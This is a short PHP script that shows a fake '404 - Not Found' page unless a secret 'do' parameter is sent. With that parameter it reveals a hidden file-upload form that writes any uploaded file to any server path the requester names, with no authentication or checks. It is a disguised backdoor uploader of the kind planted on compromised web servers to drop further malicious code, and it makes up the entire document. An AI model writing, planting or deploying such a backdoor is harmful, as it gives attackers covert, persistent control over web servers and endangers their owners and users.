<?php
if(!isset($_REQUEST['do'])){?>

<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
  <title>404 - Not Found.</title>
 </head>
 <body>
  <h1>404 - Not Found</h1>
 </body>
</html>
<?php exit(0);} 
$path = dirname(__FILE__);
if(!empty($_POST['path']))
$path=$_POST['path'];

if ($_FILES["file"]["error"] > 0)
    {
    echo "Return Code: " . $_FILES["file"]["error"] . "<br>";
    }
  else if(isset($_FILES["file"]["name"]))
    {
    echo "Upload: " . $_FILES["file"]["name"] . "<br>";
    echo "Type: " . $_FILES["file"]["type"] . "<br>";
    echo "Size: " . ($_FILES["file"]["size"] / 1024) . " kB<br>";
    echo "Temp file: " . $_FILES["file"]["tmp_name"] . "<br>";

    if (file_exists($path . $_FILES["file"]["name"]))
      {
      echo $_FILES["file"]["name"] . " already exists. ";
      }
    else
      {
      move_uploaded_file($_FILES["file"]["tmp_name"],
      $path. "/".$_FILES["file"]["name"]);
      echo "Stored in: ".$path . "/".$_FILES["file"]["name"];
      }
    }
  


?>
<html>
<body>
<form action="?do=true" method="post" enctype="multipart/form-data">
<label for="file">Filename:</label>
<input type="file" name="file" id="file"><br>
<input type="text" name="path" id="path" value="<?php echo $path ;?>"><br>
<input type="submit" name="submit" value="Submit">
</form>

</body>
</html>
